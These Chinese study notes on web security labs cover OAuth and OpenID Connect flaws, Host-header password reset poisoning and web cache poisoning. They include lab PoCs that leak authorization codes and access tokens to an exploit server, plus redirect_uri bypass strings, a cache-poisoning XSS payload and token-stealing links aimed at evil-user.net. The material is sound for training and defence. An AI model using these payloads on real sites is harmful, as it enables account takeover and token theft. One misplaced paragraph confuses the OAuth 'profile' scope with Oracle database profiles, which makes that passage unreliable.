尽管 OAuth 流程的许多组件是**可选**的，但强烈**推荐**其中一些组件，一个这样的例子是**state参数**。

理想情况下，**state参数应包含一个不可猜测的值**，在用户**首次启动 OAuth 流时**与用户会话**相关联的内容的哈希值**。然后，此值在客户端应用程序和 OAuth 服务**之间来回传递**，作为客户端应用程序的**CSRF 令牌形式**。

因此，如果**注意到授权请求没有发送`state`参数**，从攻击者的角度来看，这可能**意味着**他们可以**在欺骗用户浏览器完成之前自己启动 OAuth 流程**，类似于传统的[CSRF 攻击](https://portswigger.net/web-security/csrf)。这可能会产生严重后果，具体取决于客户端应用程序使用 OAuth 的方式。

考虑一个**允许用户使用经典的基于密码的机制**或**通过使用 OAuth 将他们的帐户链接到社交媒体配置文件来登录**的网站。在这种情况下，如果应用程序**未能使用该`state`参数**，攻击者可能会**通过将客户端应用程序绑定到他们自己的社交媒体帐户**来**劫持受害者用户**在客户端应用程序上**的帐户**。

如果该站点允许用户**以独占方式通过 OAuth 登录**，则该**state参数可能不太重要**。但是，不使用`state`参数仍然可以让攻击者构造登录 CSRF 攻击，从而诱骗用户登录到攻击者的帐户。

labs:强制 OAuth 配置文件链接

wp:通过客户端向服务器发送了一次认证（缺少state值但这里不重要），请求到了一个oauth-linking?code=xxxxx的资源链接，这个code应该是在服务端已经标识了我的用户名或客户端，所以当我把这个链接（通过漏洞服务器）发送给受害者时，受害者就将自己的社交资料绑定给了我，进而我获取到了admin权限。

####泄露授权码和访问令牌

经典漏洞：当 **OAuth 服务本身的配置**使攻击者能够**窃取授权代码或访问与其他用户帐户关联的令牌**时。攻击者可能会以受害者用户身份**登录任何**注册了此 OAuth 服务的客户端应用程序

**通过受害者的浏览器**将**代码或令牌发送到授权请求参数中`/callback`指定的端点**。`redirect_uri`如果 OAuth 服务**未能正确验证此 URI**，则攻击者可能能够构建类似 CSRF 的攻击，诱使受害者的浏览器启动 OAuth 流，该流将代码或令牌发送给**攻击者控制的`redirect_url`**.

在授权code流的情况下，攻击者可能会**在受害者的code被使用之前窃取它**。然后，他们可以将此代码**发送到客户端应用程序的合法`/callback`端点（原始端点`redirect_uri`）以访问用户帐户**。在这种情况下，攻击者甚至不需要知道客户端密码或生成的访问令牌。**只要受害者与 OAuth 服务有一个有效的会话**，客户端应用程序就会在将攻击者登录到受害者的帐户之前简单地**代表攻击者完成code/令牌交换**。

请注意，使用`state`或`nonce`保护并不一定能阻止这些攻击，因为攻击者可以从他们自己的浏览器中生成新值。

更安全的授权服务器`redirect_uri`**在交换代码时也需要发送一个参数**。然后，服务器可以检查这是否与它在初始授权请求中收到的匹配，如果不匹配，则拒绝交换。**由于这发生在通过安全反向通道的服务器到服务器请求中，攻击者无法控制第二个`redirect_uri`参数**。

labs：通过 redirect_uri 劫持 OAuth 帐户

wp：判断是否服务器有对redir_uri进行检测，通过漏洞服务器发送poc，获取code，进行劫持。

：在OAuth服务端收到redirect_uri时验证其是否在白名单内

```
poc：
<iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

#####有缺陷的 redirect_uri 验证

最佳实践是客户端应用程序在注册 OAuth 服务时提供其真实回调 URI 的白名单。这样，当 OAuth 服务接收到新请求时，它可以`redirect_uri`根据此白名单验证参数。在这种情况下，提供外部 URI 可能会导致错误。但是，可能仍然有绕过此验证的方法。

在审核 OAuth 流时，应该尝试使用该`redirect_uri`参数来了解它是如何被验证的。例如：

- 一些实现通过**仅检查字符串是否以正确的字符序列（即批准的域）开头**来允许一系列子目录。**应该尝试删除或添加任意路径、查询参数和片段**，以**查看可以更改哪些内容而不会触发错误**。

- 如果可以**将额外的值附加到默认`redirect_uri`参数**，可能**能够利用 OAuth 服务的不同组件解析 URI 之间的差异**。例如，可以尝试以下技术：

  ```
  https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
  ```

  如果您不熟悉这些技术，建议阅读我们关于如何[规避常见 SSRF 防御](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses)和[CORS](https://portswigger.net/web-security/cors#errors-parsing-origin-headers)的内容。

- 可能偶尔**会遇到服务器端参数污染漏洞**。以防万一，**应该尝试提交重复`redirect_uri`的参数**，如下所示：

  ```
  https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
  ```

- **一些服务器还对`localhost`URI 进行特殊处理**，因为它们在开发过程中经常使用。在某些情况下，**任何以开头的重定向 URI`localhost`都可能在生产环境中被意外允许**。这可以通过**注册域名**（例如`localhost.evil-user.net`.

**不应将测试限制为仅单独探测`redirect_uri`参数**。**常需要尝试对多个参数进行不同的更改组合**。**有时更改一个参数会影响其他参数的验证**。例如，将`response_mode`from更改为`query`to`fragment`有时可以完全改变 的解析`redirect_uri`，**从而允许您提交否则会被阻止的 URI**。同样，如果您注意到`web_message`响应模式受支持，这通常允许`redirect_uri`.

#####通过代理页面窃取代码和访问令牌

无法成功将外部域提交为`redirect_uri`,应该对可以篡改 URI 的哪些部分有一个相对较好的了解。现在的关键是**利用这些知识来尝试访问客户端应用程序本身内更广泛的攻击面**。**尝试确定是否可以更改`redirect_uri`参数以指向白名单域上的任何其他页面**。

**尝试找到可以成功访问不同子域或路径的方法**。例如，默认 URI 通常位于特定于 OAuth 的路径上，例如`/oauth/callback`，可以**使用[目录遍历](https://portswigger.net/web-security/file-path-traversal)技巧**来提供域上的任意路径。

```
https://client-app.com/oauth/callback/../../example/path
```

可以在后端解释为：

```
https://client-app.com/example/path
```

**确定可以将哪些其他页面设置为重定向 URI**，检测它们是否存在用来泄漏代码或令牌的其他漏洞。对于授权code流，需要**找到一个可以让客户端访问查询参数的漏洞**，而对于[隐式授权类型](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type)，需要提取 URL 片段。

为此目的最有用的漏洞之一是**开放重定向**。可以将其用作代理，**将受害者及其代码或令牌转发到攻击者控制的域**，就可以在其中托管攻击者喜欢的任何恶意脚本。

对于隐式授权类型，**窃取访问令牌**不仅仅能够在客户端应用程序上登录受害者的帐户。由于整个隐式流程通过浏览器进行，还可以**使用令牌对 OAuth 服务的资源服务器进行自己的 API 调用**。这能够从客户端应用程序的**Web UI 获取通常无法访问的敏感用户数据**。

**应该寻找任何其他允许您提取代码或令牌并将其发送到外部域的漏洞。一些很好的例子包括：**

- **处理查询参数和 URL 片段的危险 JavaScript**
  例如，不安全的 Web 消息传递脚本可以很好地解决这个问题。在某些情况下，您可能必须确定一个较长的小工具链，以允许您通过一系列脚本传递令牌，然后最终将其泄漏到您的外部域。
- **XSS漏洞**
  尽管 XSS 攻击本身可能会产生巨大的影响，但攻击者通常会在很短的时间内访问用户的会话，然后才能关闭选项卡或导航离开。由于该`HTTPOnly`属性通常用于会话 cookie，因此攻击者通常也无法使用 XSS 直接访问它们。但是，通过窃取 OAuth 代码或令牌，攻击者可以在自己的浏览器中访问用户帐户。这使他们有更多时间来探索用户数据并执行有害操作，从而显着增加了 XSS 漏洞的严重性。
- **HTML 注入漏洞**
  在无法注入 JavaScript 的情况下（例如，由于[CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)限制或严格过滤），您仍然可以使用简单的 HTML 注入来窃取授权码。如果您可以将`redirect_uri`参数指向可以注入您自己的 HTML 内容的页面，您可能能够通过`Referer`标头泄漏代码。例如，考虑以下`img`元素：`<img src="evil-user.net">`. 尝试获取此图像时，某些浏览器（例如 Firefox）会在`Referer`请求的标头中发送完整的 URL，包括查询字符串。

labs

wp：检查redirect_uri可以存在目录遍历。**/../post/next?path=**通过重定向（漏洞利用服务器），诱导点击盗用token。网站对 userinfo 端点进行 API 调用，`/me`然后使用它获取的数据来登录用户。修改Authorization: Bearer认证并绕过。

```
<script>
    if (!document.location.hash) {
        window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```



```
<script>
    if (!document.location.hash) {
       window.location = 'https://oauth-0a6100bc0475b613c0510174028d00eb.web-security-academy.net/auth?client_id=bri4o1igz21d4y80leatr&redirect_uri=https://0a24001b04c6b6e8c0ee0181004d0062.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0100d3048db684c04d016c019200fc.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
   } else {
       window.location = '/?'+document.location.hash.substr(1)
   }
</script>
```

####有缺陷的范围验证

**在任何 OAuth 流程中，用户必须根据授权请求中定义的范围批准请求的访问权限**。但在某些情况下，由于 OAuth 服务的验证存在缺陷，攻击者可能会“升级”具有额外权限的访问令牌（被盗或使用恶意客户端应用程序获得）。执行此操作的过程取决于授权类型。

#####权限提升：授权码流

虽然无法通过第三方获取他人的授权码，攻击者可以通过自己的客户端应用程序，最初使用`openid email`范围请求访问用户的电子邮件地址。用户批准此请求后，恶意客户端应用程序会收到一个授权码。当攻击者控制他们的客户端应用程序时，他们可以向包含附加范围 `scope`的代码/令牌交换请求添加另一个参数：`profile`

```
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```

profile可以用来对用户所能使用的数据库资源进行限制，可以通过DBA_USERS以及DBA_PROFILES查看用户可以使用多少资源。使用Create Profile命令创建一个Profile，用它来实现对数据库资源的限制使用，如果把该profile分配给用户，则该用户所能使用的数据库资源都在该profile的限制之内。

如果服务器没有根据初始授权请求的范围验证这一点，它有时会使用新范围生成访问令牌并将其发送到攻击者的客户端应用程序：

```
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```

#####权限提升：隐式流

对于[隐式授权类型](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type)，访问令牌是通过浏览器发送的，这意味着攻击者可以窃取与无辜客户端应用程序相关的令牌并直接使用它们。一旦他们窃取了访问令牌，他们就可以向 OAuth 服务的`/userinfo`端点发送一个基于浏览器的普通请求，在此过程中手动添加一个新`scope`参数。

理想情况下，OAuth 服务应`scope`根据生成令牌时使用的值验证此值，但情况并非总是如此。只要调整后的权限不超过先前授予此客户端应用程序的访问级别，攻击者就可能访问其他数据，而无需用户进一步批准。

####未经验证的用户注册

通过 OAuth 对用户进行身份验证时，客户端应用程序会隐含假设 OAuth 提供者存储的信息是正确的。这可能是一个危险的假设。

一些提供 OAuth 服务的网站允许用户注册帐户而无需验证他们的所有详细信息，在某些情况下包括他们的电子邮件地址。攻击者可以通过使用与目标用户相同的详细信息（例如已知电子邮件地址）向 OAuth 提供商注册帐户来利用此漏洞。然后，客户端应用程序可能允许攻击者通过 OAuth 提供者的欺诈帐户以受害者身份登录。



### 使用 OpenID Connect 扩展 OAuth

**当用于身份验证时，OAuth 通常使用 OpenID Connect 层进行扩展，该层提供了一些与识别和验证用户相关的附加功能。**

OpenID Connect 扩展了 OAuth 协议以提供位于**基本 OAuth 实现之上的专用身份和身份验证层**。它添加了一些简单的功能，可以更好地支持 OAuth 的身份验证用例。

**OAuth 最初设计时并未考虑到身份验证**；它旨在成为在应用程序之间对特定资源进行授权的一种方式。但是，许多网站开始**自定义 OAuth 以用作身份验证机制**。为了实现这一点，他们通常请求对一些基本用户数据的读取访问权限，并且如果他们被授予此访问权限，则假设用户在 OAuth 提供者方面进行了身份验证。

这些普通的[OAuth 身份验证](https://portswigger.net/web-security/oauth#oauth-authentication)机制远非理想。首先，**客户端应用程序无法知道用户何时、何地或如何进行身份验证**。由于这些实现中的每一个都是某种自定义解决方法，因此也**没有为此目的请求用户数据的标准方法**。为了正确支持 OAuth，客户端应用程序必须为每个提供者配置单独的 OAuth 机制，每个提供者具有不同的端点、唯一的范围集等。

OpenID Connect 通过添加标准化的、与身份相关的功能解决了很多这些问题，使通过 OAuth 进行的身份验证以更可靠和统一的方式工作。

####工作原理

#####OpenID Connect 角色

OpenID Connect 的角色与标准 OAuth 的角色基本相同。主要区别在于规范使用的术语略有不同。

- **依赖方**- 请求用户身份验证的应用程序。这与 OAuth 客户端应用程序同义。
- **最终用户**- 正在接受身份验证的用户。这与 OAuth 资源所有者同义。
- **OpenID 提供程序**- 配置为支持 OpenID Connect 的 OAuth 服务。

#####OpenID Connect 声明和范围

术语“声明”是指`key:value`在资源服务器上表示有关用户信息的对。索赔的一个例子可能是`"family_name":"Montoya"`。

与基本 OAuth 不同，其[范围对每个提供者都是唯一的](https://portswigger.net/web-security/oauth/grant-types#oauth-scopes)，所有 OpenID Connect 服务都使用一组相同的范围。为了使用 OpenID Connect，客户端应用程序**必须`openid`在授权请求中指定范围**。然后它们可以包括一个或多个其他标准范围：

- `profile`
- `email`
- `address`
- `phone`

这些范围中的每一个都对应于对 OpenID 规范中定义的有关用户的声明子集的读取访问权限。例如，请求范围`openid profile`将授予客户端应用程序对与用户身份相关的一系列声明的读取权限，例如`family_name`、`given_name`、`birth_date`等。

#####身份令牌

OpenID Connect 提供的**另一个主要附加功能是`id_token`响应类型**。这将**返回一个使用 JSON Web 签名 (JWS) 签名的 JSON Web 令牌 ( JWT )**。JWT 有效负载**包含基于最初请求的范围的声明列表。它还包含有关用户上次通过 OAuth 服务进行身份验证的方式和时间的信息**。客户端应用程序可以**使用它来决定用户是否已经过充分的身份验证**。

**`id_token`减少了需要在客户端应用程序和 OAuth 服务之间发送的请求数量**，这可以提供更好的整体性能。**无需获取访问令牌然后单独请求用户数据，包含此数据的 ID 令牌会在用户进行身份验证后立即发送到客户端应用程序**。

不像在基本 OAuth 中那样简单地依赖受信任的通道，**ID 令牌中传输的数据的完整性基于 JWT 加密签名**。出于这个原因，使用 ID 令牌可能有助于防止一些中间人攻击。然而，**鉴于用于签名验证的加密密钥是通过相同的网络通道（通常暴露在`/.well-known/jwks.json`）上传输的，一些攻击仍然是可能的。**

请注意，**OAuth 支持多种响应类型，因此客户端应用程序发送具有基本 OAuth 响应类型和 OpenID Connect`id_token`响应类型的授权请求是完全可以接受的**：

```
response_type=id_token token
response_type=id_token code
```

在这种情况下，**ID 令牌和代码或访问令牌**都将同时发送到客户端应用程序。

####OpenID Connect 漏洞

#####不受保护的动态客户端注册

OpenID 规范概述了**一种允许客户端应用程序向 OpenID 提供者注册的标准化方式**。如果支持动态客户端注册，则客户端应用程序**可以通过向专用端点发送`POST`请求来注册自己**。`/registration`此端点的名称通常在配置文件和文档中提供。

在请求正文中，客户端应用程序**以 JSON 格式提交有关自身的关键信息**。例如，通常需要**包含一组列入白名单的重定向 URI**。它还可以提交一系列附加信息，例如他们想要公开的端点的名称、他们的应用程序的名称等等。典型的注册请求可能如下所示：

```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

OpenID 提供者应要求客户端应用程序对其自身进行身份验证。在上面的示例中，他们使用的是 HTTP 不记名令牌。但是，一些提供商将**允许在没有任何身份验证的情况下进行动态客户端注册**，这使攻击者能够注册自己的恶意客户端应用程序。这可能会产生各种后果，**具体取决于如何使用这些攻击者可控属性的值**。

例如，**其中一些属性可以作为 URI 提供。如果 OpenID 提供者访问其中任何一个，这可能会导致二阶[SSRF](https://portswigger.net/web-security/ssrf)漏洞，除非采取额外的安全措施**。

labs:SSRF 通过 OpenID 动态客户端注册

wp:

#####通过引用允许授权请求

到目前为止，我们已经了解了提交授权请求所需参数的标准方法，即通过查询字符串。一些 OpenID 提供程序让您可以选择将这些作为 JSON Web 令牌 (JWT) 传入。**如果支持此功能，可以发送一个`request_uri`指向 JSON Web 令牌的参数，该令牌包含其余的 OAuth 参数及其值**。根据 OAuth 服务的配置，此`request_uri`参数是 SSRF 的另一个潜在向量。

**还可以使用此功能绕过对这些参数值的验证。一些服务器可能会有效地验证授权请求中的查询字符串，但可能无法将相同的验证充分应用于 JWT 中的参数，包括`redirect_uri`.**

**要检查是否支持此选项，应该`request_uri_parameter_supported`在配置文件和文档中查找该选项**。或者**尝试添加`request_uri`参数以查看它是否有效**。你会发现有些服务器支持这个特性，即使他们没有在他们的文档中明确提到它。



## HTTP主机头攻击

依照发现的**错误配置和有缺陷的业务逻辑**  （**通过 HTTP Host 标头将网站暴露于各种攻击**）进行攻击。



### http标头作用

指定客户端要访问的域名，目的是帮助识别客户端想要与哪个后端组件通信。

虚拟主机（单个 Web 服务器托管多个网站或应用程序），路由转发

###http标头漏洞利用

####提供任意 Host 标头



###密码重置中毒

攻击者可借此操纵易受攻击的网站生成指向其控制下的域的密码重置链接。可以利用这种行为来窃取重置任意用户密码所需的秘密令牌，并最终破坏他们的帐户。





如果发送给用户的 URL 是基于可控输入动态生成的，例如 Host 头，则可能构造如下密码重置中毒攻击：

1. 攻击者根据需要获取受害者的电子邮件地址或用户名，并代表他们提交密码重置请求。提交表单时，他们拦截生成的 HTTP 请求并修改 Host 标头，使其指向他们控制的域。对于此示例，我们将使用`evil-user.net`.

2. 受害者直接从网站收到一封真正的密码重置电子邮件。这似乎包含一个用于重置其密码的普通链接，并且至关重要的是，它包含一个与其帐户相关联的有效密码重置令牌。但是，URL 中的域名指向了攻击者的服务器：

   ```
   https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
   ```

3. 如果受害者单击此链接（或以其他方式获取该链接，例如通过防病毒扫描程序），密码重置令牌将被传送到攻击者的服务器。

4. 攻击者现在可以访问易受攻击网站的真实 URL，并通过相应的参数提供受害者被盗的令牌。然后，他们将能够将用户的密码重置为他们喜欢的任何密码，然后登录到他们的帐户。

例如，在真正的攻击中，攻击者可能会通过首先用虚假的违规通知预热受害者来增加受害者点击链接的可能性。

即使您无法控制密码重置链接，有时您也可以使用 Host 标头将 HTML 注入敏感电子邮件中。请注意，电子邮件客户端通常不执行 JavaScript，但其他 HTML 注入技术（如[悬空标记攻击](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)）可能仍然适用。



**labs:基本密码重置中毒**

wp:向用户发送的重置密码邮件中确认host头及name参数没有被检查，通过漏洞利用服务器，盗取用户token，套用到自身的重置密码功能。

**labs：密码重置中毒通过中间件**

wp：向用户发送的重置密码邮件中确认name参数没有被检查，host头无法篡改，通过添加X-Forwarded-Host: your-exploit-server-id.web-security-academy.net头。通过漏洞利用服务器，盗取用户token，套用到自身的重置密码功能。

ps：X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案[1]中正式提出。

https://blog.csdn.net/u012206617/article/details/103913930/

**labs：通过悬挂标记重置密码中毒**

wp：

###Web 缓存中毒



###利用经典的服务器端漏洞

###绕过认证

###虚拟主机暴力破解

###基于路由的 SSRF 

###连接状态攻击



















##Web缓存中毒

### 缓存的概念

- **时间局部性**：一个数据被访问过之后，可能**很快会被再次访问**到；

- **空间局部性**：一个数据被访问时，其**周边的数据也有可能被访问**到

- **数据缓存**：例如**MySQL到web应用服务器之间的缓存**，服务器缓存的资源是**数据缓存**

- **页面缓存**：**接入层和应用层中间的缓存**，服务器缓存的是**可缓存的页面**，这层就是缓存层

- 缓存命中率：hit/(hit+miss)，一般高于30%命中率则是正向收益，好的设计系统可以达到80%到95%以上

- 字节命中率：按照数据的字节大小来计算命中率

- 请求命中率：按照请求的数量来计算命中率

- **代理式缓存**：客户端访问缓存服务器，**缓存服务器没有命中缓存时到后端服务器请求数据**，此时它作为**反向代理服务器工作**，这种类型的缓存服务器叫做代理式缓存

- **旁挂式缓存**：**客户端亲自去查询数据库，并且将数据复制给缓存服务器一份，下次先去找缓存服务器，如果没有命中则再去数据库服务器查询**，此时这种工作方式的缓存叫做旁挂式缓存，这个客户端叫做胖客户端（smart client）

- private cache：私有缓存，用户代理附带的本地缓存机制

- public cache：公共缓存，反向代理服务器的缓存功能

- **CND：Content Delivery Network 内容投递系统**

- **请求报文**用于通知缓存服务如何使用缓存响应请求：

  "no-cache" 不能使用缓存系统中的缓存响应我，必须先去应用服务器做缓存验证

  "no-store" 不能使用缓存系统中的缓存响应我，必须去应用服务器请求响应我

- **响应报文**用于通知缓存服务器如何存储上级服务器响应的内容：

  cache-response-directive ="public" 所有缓存系统都可以缓存

  "private" [ "=" <"> 1#field-name <"> ] 仅能够被私有缓存所缓存

  "no-cache" [ "=" <"> 1#field-name <"> ]，可缓存，但响应给客户端之前需要revalidation，即必须发出条件式请求进行缓存有效性验正

  "no-store" ，不允许存储响应内容于缓存中

  "no-transform" 不能转换格式

  "must-revalidate" 必须重新验证

  "proxy-revalidate"

  "max-age" "=" delta-seconds 私有缓存最大缓存时长

  "s-maxage" "=" delta-seconds 公共缓存最大缓存时长

###原理

攻击者利用该技术利用 Web 服务器和缓存的行为，从而将有害的 HTTP 响应提供给其他用户。

Web 缓存中毒涉及两个阶段。首先，攻击者必须弄清楚如何从无意中包含某种危险负载的后端服务器获取响应。一旦成功，他们需要确保他们的响应被缓存并随后提供给目标受害者。

中毒的 Web 缓存可能是一种破坏性的手段，可以传播多种不同的攻击，利用[XSS](https://portswigger.net/web-security/cross-site-scripting)、JavaScript 注入、开放重定向等漏洞。





当缓存接收到一个HTTP请求时，首先要判断是否有缓存的响应可以直接服务，或者是否必须转发请求给后端服务器处理。缓存通过比较请求组件的预定义子集（统称为“缓存键”）来识别等效请求。通常，这将包含请求行和`Host`标题。未包含在缓存键中的请求组件称为“未键控”。

### 市面技术

####Varnish

是一款高性能的开源HTTP加速器

Varnish的功能并非仅限于此。Varnish的核心功能是将后端web服务器返回的结果缓存起来，如果发现后续有相同的请求，Varnish将不会将这个请求转发到web服务器，而是返回缓存中的结果。这将有效的降低web服务器的负载，提升响应速度，并且每秒可以响应更多的请求。Varnish速度很快的另一个主要原因是其缓存全部都是放在内存里的，这比放在磁盘上要快的多

处理缓存的顺序：接受到请求 –- 分析请求（分析你的URL，分析你的首部） -- hash计算 -- 查找缓存 -- 新鲜度检测 --- 访问源 --- 缓存 – 建立响应报文 – 响应并记录日志。

####CDN

Cloudflare的CDN是高度可定制的CDN，能够让用户对内容在其网络上的缓存方式进行高级控制。 通过页面规则 (Page Rules)，可以为各个 URL 指定特定行为，包括缓存的内容和持续时间。缓存分散在不同的地理位置。

内容交付网络（CDN）是指一组在地理上分散的服务器，它们协同工作以提供互联网内容的快速交付。CDN允许快速转移加载互联网内容所需的资产，包括HTML页面、javascript 文件、样式表、图像和视频。

CDN 的全球分布意味着减少用户与网站资源之间的距离。 CDN 使得用户不必连接到网站源站的所在地，而可以连接到地理位置更近的数据中心 。更少的传输时间意味着更快的服务。



####Web 应用程序和框架（如 Drupal）具有内置缓存

####客户端浏览器缓存

####DNS 缓存

###产生

当缓存接收到一个HTTP请求时，首先要判断是否有缓存的响应可以直接服务，或者是否必须转发请求给后端服务器处理。缓存通过比较请求组件的预定义子集（统称为“缓存键”）来识别等效请求。通常，这将包含请求行和Host标题。未包含在缓存键中的请求组件称为“未键控”。

**至关重要的是，缓存完全忽略了请求的其他组件**

Web 缓存中毒的影响在很大程度上取决于两个关键因素：

- **攻击者究竟可以成功缓存什么**
  由于中毒缓存更多的是一种分发手段而不是独立攻击，因此 Web 缓存中毒的影响与注入的有效负载的危害程度密不可分。与大多数类型的攻击一样，Web 缓存中毒也可以与其他攻击结合使用，以进一步扩大潜在影响。
- **受影响页面上的流量**
  中毒响应只会提供给在缓存中毒时访问受影响页面的用户。因此，影响的范围从不存在到巨大，具体取决于页面是否受欢迎。例如，如果攻击者设法毒化主要网站主页上的缓存响应，则该攻击可能会影响数千名用户，而无需攻击者进行任何后续交互。

请注意，缓存条目的持续时间不一定会影响 Web 缓存中毒的影响。通常可以编写攻击脚本，使其无限期地重新毒化缓存。

### 流程

一般来说，构建一个基本的 Web 缓存中毒攻击涉及以下步骤：

1. 识别和评估未键入的输入
2. 从后端服务器引发有害响应
3. 获取缓存的响应

####识别和评估未键入的输入

任何 Web 缓存中毒攻击都依赖于对未键入的输入（例如标头）的操作

**在决定是否向用户提供缓存响应时，Web 缓存会忽略未键入的输入**，这种行为意味着可以使用它们来注入有效负载并引发“中毒”响应，如果缓存，它将提供给其请求具有匹配缓存键的所有用户。

```
Param Miner工具
在实时网站上测试未键入的输入时，可能会无意中导致缓存将您生成的响应提供给真实用户。因此，确保您的请求都具有唯一的缓存键是很重要的，这样它们只会被提供给您。为此，您可以在每次发出请求时手动将缓存破坏器（例如唯一参数）添加到请求行。或者，如果您使用的是 Param Miner，则可以选择为每个请求自动添加缓存破坏器。
```

#### 从后端服务器引发有害响应

确定了无键输入，下一步就是准确评估网站如何处理它。如果输入反映在服务器的响应中而没有经过适当的清理，或者用于动态生成其他数据，那么这就是 Web 缓存中毒的潜在入口点。

####获取缓存的响应

响应是否被缓存取决于各种因素，例如文件扩展名、内容类型、路由、状态代码和响应标头。处理不同页面上的请求并研究缓存的行为方式。弄清楚如何获取包含恶意输入的缓存响应，就可以将漏洞利用传递给潜在的受害者。



### 利用

#### 利用缓存设计缺陷

##### 使用 Web 缓存中毒来进行XSS攻击

`X-Forwarded-Host`标头通常是未键入的

简单利用

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

##### 使用 Web 缓存中毒来利用资源导入的不安全处理

一些网站使用非键标头动态生成用于导入资源的 URL，例如外部托管的 JavaScript 文件。在这种情况下，如果攻击者将相应标头的值更改为他们控制的域，他们可能会操纵 URL 以指向他们自己的恶意 JavaScript 文件。

如果包含此恶意 URL 的响应被缓存，攻击者的 JavaScript 文件将被导入并在其请求具有匹配缓存键的任何用户的浏览器会话中执行。

```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```









































































##番外


dependency track


sonar


sonar qube

owasp





xss绕过技巧:https://blog.csdn.net/nigo134/article/details/118827542?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-118827542-blog-123534829.pc_relevant_aa&spm=1001.2101.3001.4242.1&utm_relevant_index=3